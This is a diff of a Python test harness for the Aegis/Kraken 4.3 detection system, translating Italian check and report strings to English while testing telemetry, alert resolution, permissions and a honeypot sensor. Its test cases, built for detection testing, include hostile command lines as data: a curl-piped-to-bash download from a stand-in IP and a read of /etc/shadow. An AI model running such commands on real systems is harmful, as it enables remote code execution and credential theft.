@@ -534,7 +534,7 @@ MALICIOUS: List[Dict[str, Any]] = [
     case("mal-linux-curl-pipe", "malicious", "curl | bash", "T1059.004", dict(
         process_name="bash", process_path="/bin/bash",
         command_line="curl -s http://203.0.113.9/i.sh | bash", user="dev", os="Linux"), True, None),
-    case("mal-linux-shadow", "malicious", "lettura shadow", "T1003.008", dict(
+    case("mal-linux-shadow", "malicious", "shadow read", "T1003.008", dict(
         process_name="cat", process_path="/usr/bin/cat",
         command_line="cat /etc/shadow", user="www-data", os="Linux"), True, None,
         note="T1003.008 non ha una regola statica: FN atteso"),
@@ -798,8 +798,8 @@ def soak(brain: Brain, agents: int, duration: int, stop: threading.Event) -> Dic
         "events_lost_delta": (lost(lost_after) - lost(lost_before))
         if lost(lost_before) is not None and lost(lost_after) is not None else None,
     }
-    check("soak senza errori HTTP", res["errors"] == 0, f"errors={res['errors']}")
-    check("soak senza eventi persi", res["events_lost_delta"] in (0, None),
+    check("soak without HTTP errors", res["errors"] == 0, f"errors={res['errors']}")
+    check("soak without lost events", res["events_lost_delta"] in (0, None),
           f"lost={res['events_lost_delta']}")
     print(f"  {res['rps']} rps, p50={res['p50_ms']}ms p95={res['p95_ms']}ms, "
           f"errori={res['errors']}, persi={res['events_lost_delta']}")
@@ -828,7 +828,7 @@ def telemetry_contract(brain: Brain) -> Dict[str, Any]:
     except ValueError:
         pass
     rows = psql(f"select count(*) from telemetry where device_id='{agent_id}'::uuid;")
-    check("event_id duplicato riconosciuto", second.status_code == 200 and dup_status == "duplicate",
+    check("duplicate event_id recognised", second.status_code == 200 and dup_status == "duplicate",
           f"{second.status_code} status={dup_status}")
     res["duplicate"] = {"first": first.status_code, "second": second.status_code,
                         "status": dup_status, "rows": rows}
@@ -836,40 +836,40 @@ def telemetry_contract(brain: Brain) -> Dict[str, Any]:
     r = brain.s.post(brain._url("/api/v1/telemetry/report"),
                      json={k: v for k, v in base.items() if k != "event_type"},
                      headers=brain.agent_headers(agent_id, secret), timeout=30)
-    check("payload senza event_type rifiutato 422", r.status_code == 422, str(r.status_code))
+    check("payload without event_type rejected 422", r.status_code == 422, str(r.status_code))
     res["missing_event_type"] = r.status_code
 
     bad = brain.s.post(brain._url("/api/v1/telemetry/report"),
                        json={**base, "event_id": str(uuid.uuid4())},
                        headers={"X-Agent-Id": agent_id, "Authorization": "Bearer wrong"},
                        timeout=30)
-    check("segreto agente errato rifiutato", bad.status_code in (401, 403), str(bad.status_code))
+    check("wrong agent secret rejected", bad.status_code in (401, 403), str(bad.status_code))
     res["bad_secret"] = bad.status_code
 
     long_cmd = "powershell.exe -c " + ("A" * 6000)
     r = brain.report(agent_id, secret, {**base, "event_id": str(uuid.uuid4()),
                                         "command_line": long_cmd})
-    check("command_line oltre il limite troncata, non 422", r.status_code == 200, str(r.status_code))
+    check("command_line over the limit truncated, not 422", r.status_code == 200, str(r.status_code))
     res["long_command_line"] = r.status_code
 
     big = [{"name": f"p{i}.exe", "pid": i} for i in range(600)]
     r = brain.report(agent_id, secret, {**base, "event_id": str(uuid.uuid4()), "processes": big})
-    check("600 processi accettati (lista troncata, non 422)", r.status_code == 200,
+    check("600 processes accepted (list truncated, not 422)", r.status_code == 200,
           str(r.status_code))
     stored = psql("select coalesce(jsonb_array_length((processes::jsonb)->'list'),0) "
                   "from telemetry where device_id='" + agent_id + "'::uuid "
                   "order by id desc limit 1;")
-    check("lista processi troncata a 500 nel DB", stored == "500", f"righe={stored}")
+    check("process list truncated to 500 in the DB", stored == "500", f"righe={stored}")
     res["processes_600"] = {"status": r.status_code, "stored": stored}
 
     nul = brain.report(agent_id, secret, {**base, "event_id": str(uuid.uuid4()),
                                           "command_line": "cmd.exe /c echo a\u0000b"})
-    check("NUL nella command line non rompe la scrittura", nul.status_code == 200,
+    check("NUL in the command line does not break the write", nul.status_code == 200,
           str(nul.status_code))
     res["nul_byte"] = nul.status_code
 
     unknown = brain.report(str(uuid.uuid4()), "x" * 32, {**base, "event_id": str(uuid.uuid4())})
-    check("agente sconosciuto rifiutato", unknown.status_code in (401, 403, 404),
+    check("unknown agent rejected", unknown.status_code in (401, 403, 404),
           str(unknown.status_code))
     res["unknown_agent"] = unknown.status_code
     return res
@@ -901,7 +901,7 @@ def resolvers(brain: Brain) -> Dict[str, Any]:
     res["created"] = target["id"]
 
     open_list = [a for a in brain.alerts(is_resolved="false") if str(a.get("agent_id")) == agent_id]
-    check("alert presente tra i non risolti", any(a["id"] == target["id"] for a in open_list))
+    check("alert present among the unresolved", any(a["id"] == target["id"] for a in open_list))
 
     r = brain.resolve(target["id"], True)
     body = {}
@@ -910,28 +910,28 @@ def resolvers(brain: Brain) -> Dict[str, Any]:
     except ValueError:
         pass
     check("PATCH resolve 200", r.status_code == 200, r.text[:120])
-    check("resolve riporta il muting attivo", int(body.get("triage_muted_seconds") or 0) > 0,
+    check("resolve reports active muting", int(body.get("triage_muted_seconds") or 0) > 0,
           f"triage_muted_seconds={body.get('triage_muted_seconds')}")
-    check("resolve imposta is_resolved", body.get("is_resolved") is True, str(body.get("is_resolved")))
+    check("resolve sets is_resolved", body.get("is_resolved") is True, str(body.get("is_resolved")))
     res["resolve"] = {"status": r.status_code, "muted_s": body.get("triage_muted_seconds"),
                       "killed": body.get("process_killed")}
 
     unresolved = [a["id"] for a in brain.alerts(is_resolved="false") if str(a.get("agent_id")) == agent_id]
     resolved = [a["id"] for a in brain.alerts(is_resolved="true") if str(a.get("agent_id")) == agent_id]
-    check("risolto fuori dai non risolti", target["id"] not in unresolved)
-    check("risolto presente nei risolti", target["id"] in resolved)
+    check("resolved alert no longer among unresolved", target["id"] not in unresolved)
+    check("resolved alert present among resolved", target["id"] in resolved)
     detail = brain.alert(target["id"])
-    check("dettaglio coerente con il resolve", detail.get("is_resolved") is True)
+    check("detail consistent with the resolve", detail.get("is_resolved") is True)
 
     before = len([a for a in brain.alerts() if str(a.get("agent_id")) == agent_id])
     fire("b")
     time.sleep(1.5)
     after = len([a for a in brain.alerts() if str(a.get("agent_id")) == agent_id])
-    check("detection identica silenziata dopo il resolve", after == before, f"{before}->{after}")
+    check("identical detection muted after resolve", after == before, f"{before}->{after}")
     res["muted_after_resolve"] = {"before": before, "after": after}
 
     r = brain.resolve(target["id"], False)
-    check("riapertura alert 200", r.status_code == 200, r.text[:120])
+    check("alert reopen 200", r.status_code == 200, r.text[:120])
     fire("c")
     deadline = time.time() + 20
     reopened = 0
@@ -940,7 +940,7 @@ def resolvers(brain: Brain) -> Dict[str, Any]:
         if reopened > after:
             break
         time.sleep(1)
-    check("dopo la riapertura la detection torna visibile", reopened > after,
+    check("after reopening, the detection is visible again", reopened > after,
           f"{after}->{reopened}")
     res["reopen"] = {"before": after, "after": reopened}
 
@@ -957,7 +957,7 @@ def resolvers(brain: Brain) -> Dict[str, Any]:
         again_body = again.json()
     except ValueError:
         pass
-    check("resolve-all idempotente (seconda chiamata 0)",
+    check("resolve-all idempotent (second call 0)",
           again.status_code == 200 and int(again_body.get("resolved") or 0) == 0,
           f"second={again_body.get('resolved')}")
     res["resolve_all"] = {"resolved": bulk.get("resolved"), "muted": bulk.get("triage_muted"),
@@ -979,11 +979,11 @@ def resolvers(brain: Brain) -> Dict[str, Any]:
         vtok = lr.json()["access_token"]
         vr = v.post(brain._url("/api/v1/telemetry/alerts/resolve-all"),
                     headers={"Authorization": f"Bearer {vtok}"}, timeout=30)
-        check("viewer non puo' fare resolve-all (403)", vr.status_code == 403, str(vr.status_code))
+        check("viewer cannot run resolve-all (403)", vr.status_code == 403, str(vr.status_code))
         res["viewer_resolve_all"] = vr.status_code
         vd = v.delete(brain._url("/api/v1/telemetry/alerts"),
                       headers={"Authorization": f"Bearer {vtok}"}, timeout=30)
-        check("viewer non puo' cancellare gli alert (403)", vd.status_code == 403, str(vd.status_code))
+        check("viewer cannot delete alerts (403)", vd.status_code == 403, str(vd.status_code))
         res["viewer_delete_all"] = vd.status_code
     else:
         check("login viewer creato", False, f"{lr.status_code} {lr.text[:100]}")
@@ -1046,7 +1046,7 @@ def kraken(brain: Brain, kraken_base: str) -> Dict[str, Any]:
     # Un retry del sensore e' idempotente per contratto: risponde con l'evento
     # gia' esistente invece di crearne un secondo. Si verifica il dato, non il
     # codice HTTP (il 409 resta solo per la corsa fra SELECT e INSERT).
-    check("Kraken retry idempotente: nessuna seconda riga",
+    check("Kraken retry is idempotent: no second row",
           r.status_code == 201 and before_rows == after_rows,
           f"status={r.status_code} rows={before_rows}->{after_rows}")
     res["duplicate_session"] = {"status": r.status_code, "rows": after_rows}
@@ -1057,7 +1057,7 @@ def kraken(brain: Brain, kraken_base: str) -> Dict[str, Any]:
                               "sensor_port": 2222},
                         headers={"X-Internal-API-Key": "wrong", "Content-Type": "application/json"},
                         timeout=30)
-    check("Kraken rifiuta chiave interna errata", bad.status_code in (401, 403), str(bad.status_code))
+    check("Kraken rejects a wrong internal key", bad.status_code in (401, 403), str(bad.status_code))
     res["bad_key"] = bad.status_code
 
     sessions_before = psql("select count(*) from deception_sessions;")
@@ -1077,8 +1077,8 @@ def kraken(brain: Brain, kraken_base: str) -> Dict[str, Any]:
         if delta_s >= len(sessions) and delta_i >= 1:
             break
         time.sleep(3)
-    check("Aegis vede le sessioni deception Kraken", delta_s >= len(sessions), f"+{delta_s}")
-    check("Aegis crea l'incidente Kraken", delta_i >= 1, f"+{delta_i}")
+    check("Aegis sees the Kraken deception sessions", delta_s >= len(sessions), f"+{delta_s}")
+    check("Aegis creates the Kraken incident", delta_i >= 1, f"+{delta_i}")
     res["aegis"] = {"sessions_delta": delta_s, "incidents_delta": delta_i}
 
     outbox = psql("select count(*) from outbox where status='sent';", "aegis-kraken-db",
@@ -1086,7 +1086,7 @@ def kraken(brain: Brain, kraken_base: str) -> Dict[str, Any]:
     pending = psql("select count(*) from outbox where status<>'sent';", "aegis-kraken-db",
                    "kraken", "krakendb")
     res["outbox"] = {"sent": outbox, "pending": pending}
-    check("outbox Kraken consegnata", not str(pending).startswith("ERR") and pending.isdigit(),
+    check("Kraken outbox delivered", not str(pending).startswith("ERR") and pending.isdigit(),
           f"pending={pending}")
 
     # L'evento Kraken deve produrre un alert Aegis risolvibile come gli altri.
@@ -1096,7 +1096,7 @@ def kraken(brain: Brain, kraken_base: str) -> Dict[str, Any]:
     if ka and "|" in ka:
         aid = int(ka.split("|")[0])
         rr = brain.resolve(aid, True)
-        check("alert Kraken risolvibile dalla dashboard Aegis", rr.status_code == 200,
+        check("Kraken alert resolvable from the Aegis dashboard", rr.status_code == 200,
               rr.text[:120])
         res["resolve_alert"] = rr.status_code
     else:
@@ -1107,7 +1107,7 @@ def kraken(brain: Brain, kraken_base: str) -> Dict[str, Any]:
                 "(coalesce(description,'') like '%Passw0rd%' or "
                 "coalesce(evidence::text,'') like '%Passw0rd%');")
     res["secret_leak_rows"] = leak
-    check("nessuna password in chiaro negli incidenti Aegis", leak in ("0",), f"rows={leak}")
+    check("no plaintext password in Aegis incidents", leak in ("0",), f"rows={leak}")
     return res
 
 
@@ -1122,16 +1122,16 @@ def write_report(payload: Dict[str, Any]) -> Path:
         so = payload.get("soak") or {}
         lines = [
             "# Soak — Aegis 4.3", "",
-            f"Eseguita: `{payload['started_at']}` → `{payload['finished_at']}`  ",
-            f"Durata totale: **{payload['elapsed_s']:.0f}s**", "",
-            "| Metrica | Valore |", "|---|---:|",
-            f"| Agenti | {so.get('agents')} |",
-            f"| Richieste | {so.get('requests')} |",
-            f"| Accettate | {so.get('accepted')} |",
-            f"| Errori | {so.get('errors')} |",
+            f"Executed: `{payload['started_at']}` → `{payload['finished_at']}`  ",
+            f"Total duration: **{payload['elapsed_s']:.0f}s**", "",
+            "| Metric | Value |", "|---|---:|",
+            f"| Agents | {so.get('agents')} |",
+            f"| Requests | {so.get('requests')} |",
+            f"| Accepted | {so.get('accepted')} |",
+            f"| Errors | {so.get('errors')} |",
             f"| Throughput | {so.get('rps')} rps |",
             f"| p50 / p95 / p99 | {so.get('p50_ms')} / {so.get('p95_ms')} / {so.get('p99_ms')} ms |",
-            f"| Eventi persi (server) | {so.get('events_lost_delta')} |", "",
+            f"| Lost events (server) | {so.get('events_lost_delta')} |", "",
         ]
         (OUT_DIR / "DEEP_SIMULATION.md").write_text("\n".join(lines), encoding="utf-8")
         return path
@@ -1140,21 +1140,21 @@ def write_report(payload: Dict[str, Any]) -> Path:
     lines = [
         "# Deep simulation — Aegis/Kraken 4.3",
         "",
-        f"Eseguita: `{payload['started_at']}` → `{payload['finished_at']}`  ",
-        f"Stack: `{payload['base']}` (Windows, pacchetti MSI 4.3.0, self-signed)  ",
-        f"Durata totale: **{payload['elapsed_s']:.0f}s**",
+        f"Executed: `{payload['started_at']}` → `{payload['finished_at']}`  ",
+        f"Stack: `{payload['base']}` (Windows, MSI packages 4.3.0, self-signed)  ",
+        f"Total duration: **{payload['elapsed_s']:.0f}s**",
         "",
-        "> Simulazione di comportamento, non esecuzione di malware. Ogni caso è",
-        "> inviato come evento reale al Brain con il flusso di enroll di un agente.",
-        "> Un agente dedicato per caso evita che la soppressione degli alert",
-        "> (per agente/regola/processo) falsi il conteggio.",
+        "> Behaviour simulation, not malware execution. Every case is",
+        "> sent to the Brain as a real event through an agent enrollment flow.",
+        "> A dedicated agent per case prevents alert suppression",
+        "> (per agent/rule/process) from skewing the count.",
         "",
         "## Detection",
         "",
-        "| Metrica | Valore |",
+        "| Metric | Value |",
         "|---|---:|",
-        f"| Casi malevoli | {m['malicious_total']} |",
-        f"| Casi benigni | {m['benign_total']} |",
+        f"| Malicious cases | {m['malicious_total']} |",
+        f"| Benign cases | {m['benign_total']} |",
         f"| True positive | {m['tp']} |",
         f"| False negative | {m['fn']} |",
         f"| False positive | {m['fp']} |",
@@ -1163,58 +1163,58 @@ def write_report(payload: Dict[str, Any]) -> Path:
         f"| Recall | {m['recall']:.3f} |",
         f"| F1 | {m['f1']:.3f} |",
         f"| False positive rate | {m['false_positive_rate']:.3f} |",
-        f"| Severità corretta | {m['severity_correct']}/{m['severity_checked']} |",
+        f"| Correct severity | {m['severity_correct']}/{m['severity_checked']} |",
         "",
     ]
     if m["false_negatives"]:
-        lines += ["### Falsi negativi (comportamento non rilevato)", "",
-                  "| Caso | Tecnica | Nota |", "|---|---|---|"]
+        lines += ["### False negatives (behaviour not detected)", "",
+                  "| Case | Technique | Note |", "|---|---|---|"]
         lines += [f"| `{x['id']}` — {x['title']} | {x['technique']} | {x['note']} |"
                   for x in m["false_negatives"]]
         lines.append("")
     if m["false_positives"]:
-        lines += ["### Falsi positivi (attività legittima che ha generato un alert)", "",
-                  "| Caso | Severità | Regole |", "|---|---|---|"]
+        lines += ["### False positives (legitimate activity that raised an alert)", "",
+                  "| Case | Severity | Rules |", "|---|---|---|"]
         lines += [f"| `{x['id']}` — {x['title']} | {x['severity']} | {', '.join(x['rules'] or [])} |"
                   for x in m["false_positives"]]
         lines.append("")
     if m["severity_mismatches"]:
-        lines += ["### Severità diversa dall'atteso", "",
-                  "| Caso | Attesa | Ottenuta |", "|---|---|---|"]
+        lines += ["### Severity differing from expected", "",
+                  "| Case | Expected | Obtained |", "|---|---|---|"]
         lines += [f"| `{x['id']}` | {x['expected']} | {', '.join(x['got'])} |"
                   for x in m["severity_mismatches"]]
         lines.append("")
-    lines += ["## Regole che hanno generato alert", "",
-              "| Regola | Alert |", "|---|---:|"]
+    lines += ["## Rules that raised alerts", "",
+              "| Rule | Alerts |", "|---|---:|"]
     lines += [f"| {k} | {v} |" for k, v in payload["rules"].items()]
     lines += ["", "## Soak", ""]
     so = payload.get("soak") or {}
     lines += [
-        "| Metrica | Valore |", "|---|---:|",
-        f"| Agenti | {so.get('agents')} |",
-        f"| Durata | {so.get('duration_s')}s |",
-        f"| Richieste | {so.get('requests')} |",
-        f"| Accettate | {so.get('accepted')} |",
-        f"| Duplicati | {so.get('duplicates')} |",
-        f"| Errori | {so.get('errors')} |",
+        "| Metric | Value |", "|---|---:|",
+        f"| Agents | {so.get('agents')} |",
+        f"| Duration | {so.get('duration_s')}s |",
+        f"| Requests | {so.get('requests')} |",
+        f"| Accepted | {so.get('accepted')} |",
+        f"| Duplicates | {so.get('duplicates')} |",
+        f"| Errors | {so.get('errors')} |",
         f"| Throughput | {so.get('rps')} rps |",
         f"| p50 / p95 / p99 | {so.get('p50_ms')} / {so.get('p95_ms')} / {so.get('p99_ms')} ms |",
-        f"| Eventi persi (server) | {so.get('events_lost_delta')} |",
+        f"| Lost events (server) | {so.get('events_lost_delta')} |",
         "",
     ]
-    lines += ["## Controlli funzionali", "", "| Controllo | Esito | Dettaglio |", "|---|---|---|"]
+    lines += ["## Functional checks", "", "| Check | Result | Detail |", "|---|---|---|"]
     lines += [f"| {c['name']} | {'PASS' if c['ok'] else 'FAIL'} | {c['detail']} |"
               for c in payload["checks"]]
-    lines += ["", "## Limiti", "",
-              "- Eventi costruiti, non traffico reale né malware eseguito.",
-              "- La severità attesa è quella del contratto delle regole statiche 4.3.",
-              "- Il soak misura il percorso HTTP+DB su un singolo host; non è una",
-              "  capacità di flotta né una prova di scalabilità.",
-              "- Kraken è esercitato sul contratto sensori→app→Aegis; non è un",
-              "  test di esposizione honeypot su rete reale.",
-              "- La persistenza non è dedotta dal delta della tabella `telemetry`",
-              "  (tabella delle metriche, condivisa con altri agenti): è verificata",
-              "  dagli snapshot degli scenari e da probe diretti sull'agente.", ""]
+    lines += ["", "## Limitations", "",
+              "- Constructed events, not real traffic and no malware executed.",
+              "- The expected severity is the one defined by the 4.3 static-rule contract.",
+              "- The soak measures the HTTP+DB path on a single host; it is not a",
+              "  fleet capacity or a scalability proof.",
+              "- Kraken is exercised on the sensors→app→Aegis contract; it is not a",
+              "  honeypot exposure test on a real network.",
+              "- Persistence is not inferred from the delta of the `telemetry` table",
+              "  (a metrics table shared with other agents): it is verified",
+              "  through scenario snapshots and direct probes of the agent.", ""]
     (OUT_DIR / "DEEP_SIMULATION.md").write_text("\n".join(lines), encoding="utf-8")
     return path
 
@@ -1267,7 +1267,7 @@ def main() -> int:
             rows = list(pool.map(lambda c: send_case(brain, c, cache), all_cases))
         save_cache(cache)
         failed = [r for r in rows if r.get("send_status") != 200]
-        check("tutti i casi inviati con 200", not failed,
+        check("all cases sent with 200", not failed,
               f"esempi={[(r['id'], r.get('send_status'), (r.get('send_body') or '')[:60]) for r in failed[:5]]}")
         agent_ids = [r["agent_id"] for r in rows if r.get("agent_id")]
         alerts = collect_alerts(brain, agent_ids, since=iso(started))
